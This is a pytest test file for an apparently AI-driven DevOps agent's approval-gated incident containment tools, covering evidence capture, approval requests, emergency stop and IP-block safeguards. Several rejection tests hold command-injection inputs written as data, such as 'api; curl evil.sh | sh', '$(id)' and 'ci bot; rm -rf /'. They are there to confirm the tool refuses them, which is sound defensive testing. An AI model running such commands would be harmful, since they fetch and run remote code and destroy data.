"""Approval-gated containment: evidence first, approval always, nothing deleted (#168)."""
import base64
import json
from datetime import datetime, timedelta, timezone
from unittest.mock import AsyncMock

import pytest

from services.incident_store import IncidentStore
from storage.memory_storage import MemoryStorage
from tools.containment import ContainmentTools, remind_expired_blocks
from tools.executor import SafeExecutor
from tools.safety import MUTATING_AGENT_TOOLS

READ_ONLY_PREFIXES = (
    "kubectl get ", "kubectl describe ", "kubectl logs ",
    "aws iam list-", "aws iam get-", "aws ec2 describe-",
    "gcloud iam service-accounts keys list", "gcloud compute firewall-rules list", "az network nsg rule list",
)


class Recorder:
    def __init__(self):
        self.calls = []

    async def run(self, command, host=None, **limits):
        self.calls.append(command)
        self.limits = limits
        assert command.startswith(READ_ONLY_PREFIXES), f"non-read-only command ran: {command}"
        return {"success": True, "stdout": f"output of {command}"}


@pytest.fixture
def tools(monkeypatch):
    monkeypatch.delenv("AGENT_EMERGENCY_STOP", raising=False)
    monkeypatch.delenv("CONTAINMENT_PROTECTED_CIDRS", raising=False)
    storage = MemoryStorage()
    monkeypatch.setattr("storage.factory.get_storage", lambda: storage)
    notifier = AsyncMock()
    t = ContainmentTools(Recorder(), notifier, IncidentStore(storage=storage))
    t.storage = storage
    return t


def approved_command(result):
    from services.approval_store import CommandApprovalStore

    reference = base64.b64decode(result["approval_payload"]).decode()
    return CommandApprovalStore().resolve(reference)


@pytest.mark.parametrize("tool", ["isolate_pod", "cordon_node", "disable_access_key", "block_ip"])
def test_containment_tools_are_mutating(tool):
    # So the emergency stop and the prompt-injection lock both refuse them.
    assert tool in MUTATING_AGENT_TOOLS


@pytest.mark.asyncio
async def test_isolate_pod_saves_evidence_then_only_requests_approval(tools):
    result = await tools.isolate_pod("INC-7", "prod", "api-6d9f")
    assert result["requires_approval"] is True and result["blocked"] is True
    # Evidence ran first, read-only only (Recorder asserts that).
    assert any(c.startswith("kubectl logs api-6d9f") for c in tools.executor.calls)
    evidence_key = result["evidence"]["key"]
    evidence = tools.storage.get_json(evidence_key)
    assert "pod_yaml" in evidence and "describe" in evidence and "events" in evidence
    # Approval posted to Slack with change and reverse.
    text = tools.notifier.send_approval_request.call_args.args[0]
    assert "INC-7" in text and "Reverse" in text
    # The retained command labels the pod and applies a deny-all policy for that label only.
    command = approved_command(result)
    assert command.startswith("kubectl label pod api-6d9f -n prod devops-agent/quarantine=")
    manifest = json.loads(base64.b64decode(command.split("printf %s ")[1].split(" ")[0]))
    assert manifest["kind"] == "NetworkPolicy"
    assert manifest["spec"]["ingress"] == [] and manifest["spec"]["egress"] == []
    assert list(manifest["spec"]["podSelector"]["matchLabels"]) == ["devops-agent/quarantine"]
    assert result["reverse"][0].startswith("kubectl delete networkpolicy agent-isolate-")


@pytest.mark.asyncio
async def test_approved_change_is_not_blocked_by_the_never_delete_rule(tools, monkeypatch):
    result = await tools.isolate_pod("INC-7", "prod", "api-6d9f")
    executor = SafeExecutor()
    ran = []

    async def fake_exec(command, host=None):
        ran.append(command)
        return {"success": True}

    executor._exec = fake_exec
    await executor.run(result["command"])
    assert len(ran) == 1 and "kubectl apply -n prod -f -" in ran[0]


@pytest.mark.asyncio
@pytest.mark.parametrize("namespace, pod", [
    ("prod", "api; curl evil.sh | sh"),
    ("prod", "$(id)"),
    ("Prod", "api"),
    ("prod", ""),
])
async def test_rejects_unsafe_names(tools, namespace, pod):
    result = await tools.isolate_pod("INC-7", namespace, pod)
    assert result["success"] is False and tools.executor.calls == []
    tools.notifier.send_approval_request.assert_not_called()


@pytest.mark.asyncio
async def test_dry_run_shows_change_without_evidence_or_approval(tools):
    result = await tools.cordon_node("INC-1", "node-a", dry_run=True)
    assert result["dry_run"] is True and result["change"] == ["kubectl cordon node-a"]
    assert result["reverse"] == ["kubectl uncordon node-a"]
    assert tools.executor.calls == []
    tools.notifier.send_approval_request.assert_not_called()


@pytest.mark.asyncio
async def test_emergency_stop_blocks_containment(tools, monkeypatch):
    monkeypatch.setenv("AGENT_EMERGENCY_STOP", "true")
    result = await tools.cordon_node("INC-1", "node-a")
    assert result.get("emergency_stop") is True or result.get("blocked") is True
    assert tools.executor.calls == []
    tools.notifier.send_approval_request.assert_not_called()


@pytest.mark.asyncio
async def test_aws_key_is_deactivated_and_sessions_revoked(tools):
    result = await tools.disable_access_key("INC-2", "aws", "AKIAABCDEFGHIJKLMNOP", "ci-bot")
    command = approved_command(result)
    assert "update-access-key --user-name ci-bot --access-key-id AKIAABCDEFGHIJKLMNOP --status Inactive" in command
    assert "put-user-policy --user-name ci-bot --policy-name AgentRevokeOlderSessions" in command
    assert "delete" not in command.lower()
    assert any("--status Active" in r for r in result["reverse"])
    assert any(c.startswith("aws iam get-access-key-last-used") for c in tools.executor.calls)


@pytest.mark.asyncio
async def test_gcp_key_is_disabled(tools):
    sa = "deployer@my-proj.iam.gserviceaccount.com"
    result = await tools.disable_access_key("INC-2", "gcp", "a" * 40, sa)
    assert approved_command(result) == f"gcloud iam service-accounts keys disable {'a' * 40} --iam-account {sa}"


@pytest.mark.asyncio
@pytest.mark.parametrize("provider, key, principal", [
    ("aws", "not-a-key", "ci-bot"),
    ("aws", "AKIAABCDEFGHIJKLMNOP", "ci bot; rm -rf /"),
    ("azure", "x", "y"),
])
async def test_rejects_bad_key_requests(tools, provider, key, principal):
    result = await tools.disable_access_key("INC-2", provider, key, principal)
    assert result["success"] is False
    tools.notifier.send_approval_request.assert_not_called()


@pytest.mark.asyncio
@pytest.mark.parametrize("provider, resource, expected", [
    ("aws", "acl-0abc", "aws ec2 create-network-acl-entry --network-acl-id acl-0abc --ingress"),
    ("gcp", "default", "gcloud compute firewall-rules create agent-block-"),
    ("azure", "rg-prod/nsg-web", "az network nsg rule create -g rg-prod --nsg-name nsg-web"),
])
async def test_block_ip_per_provider(tools, provider, resource, expected):
    result = await tools.block_ip("INC-3", "203.0.113.7", provider, resource, expires_hours=6)
    command = approved_command(result)
    assert command.startswith(expected) and "203.0.113.7/32" in command
    assert result["expires_at"]
    expiry_keys = tools.storage.list_keys(tools.storage.org_prefix("default", "containment_expiry"))
    assert len(expiry_keys) == 1


@pytest.mark.asyncio
@pytest.mark.parametrize("ip", ["0.0.0.0/0", "10.0.0.0/8", "127.0.0.1", "169.254.169.254", "not-an-ip", "2001:db8::/32"])
async def test_block_ip_refuses_dangerous_targets(tools, ip):
    result = await tools.block_ip("INC-3", ip, "aws", "acl-0abc")
    assert result["success"] is False
    tools.notifier.send_approval_request.assert_not_called()


@pytest.mark.asyncio
async def test_block_ip_refuses_protected_ranges(tools, monkeypatch):
    monkeypatch.setenv("CONTAINMENT_PROTECTED_CIDRS", "198.51.100.0/24, 10.20.0.0/16")
    result = await tools.block_ip("INC-3", "198.51.100.9", "gcp", "default")
    assert result["success"] is False and "protected" in result["error"]


@pytest.mark.asyncio
async def test_block_ip_rejects_bad_expiry(tools):
    assert (await tools.block_ip("INC-3", "203.0.113.7", "aws", "acl-0abc", expires_hours=0))["success"] is False
    assert (await tools.block_ip("INC-3", "203.0.113.7", "aws", "acl-0abc", expires_hours=10_000))["success"] is False


@pytest.mark.asyncio
async def test_expired_blocks_get_one_reminder_with_the_reverse_command(tools):
    result = await tools.block_ip("INC-3", "203.0.113.7", "aws", "acl-0abc", expires_hours=1)
    slack = AsyncMock()
    assert await remind_expired_blocks(tools.storage, slack, "default") == 0  # not expired yet
    later = datetime.now(timezone.utc) + timedelta(hours=2)
    assert await remind_expired_blocks(tools.storage, slack, "default", now=later) == 1
    message = slack.send_message.call_args.args[0]
    assert result["reverse"][0] in message and "INC-3" in message
    assert await remind_expired_blocks(tools.storage, slack, "default", now=later) == 0  # only once


@pytest.mark.asyncio
async def test_agent_dispatch_never_executes_even_with_auto_apply(monkeypatch):
    from agent.core import DevOpsAgent

    monkeypatch.setenv("ANTHROPIC_API_KEY", "dummy-test-key")
    monkeypatch.setenv("AUTO_APPLY", "true")
    monkeypatch.delenv("AGENT_EMERGENCY_STOP", raising=False)
    agent = DevOpsAgent()
    recorder = Recorder()
    agent.executor = recorder
    agent.notifier = AsyncMock()
    result = await agent.execute_tool(
        "cordon_node", {"node": "node-a"}, {"org_id": "default", "incident_id": "INC-9"}
    )
    assert result["requires_approval"] is True
    assert all(c.startswith(READ_ONLY_PREFIXES) for c in recorder.calls)
    agent.notifier.send_approval_request.assert_called_once()
